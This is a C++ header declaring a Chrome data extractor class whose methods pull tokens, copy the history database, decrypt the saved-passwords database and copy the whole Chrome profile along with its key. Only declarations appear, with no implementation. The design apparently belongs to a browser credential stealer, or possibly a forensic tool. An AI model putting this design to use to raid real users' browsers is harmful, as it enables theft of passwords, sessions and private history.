#pragma once
#include "IGoogleDbExtractor.h"
#include "utils/decrypt/IDataDecrypt.h"

namespace google
{
    class GoogleDbExtractorBase : public IGoogleDbExtractor
    {
    public:
        virtual void ExtractTokens(std::map<std::string, std::vector<unsigned char>>& tokens) override;
        virtual void CopyHistoryDb() override;
        virtual void DecryptPasswordsDb() override;
        virtual void CopyGoogleChromeFullDirWithKey() override;

     private:
        void GetEncTokens(std::map<std::string, std::vector<unsigned char>>& tokens);

     private:
        std::unique_ptr<crypt::IDataDecrypt> _decryptor;

    };
}
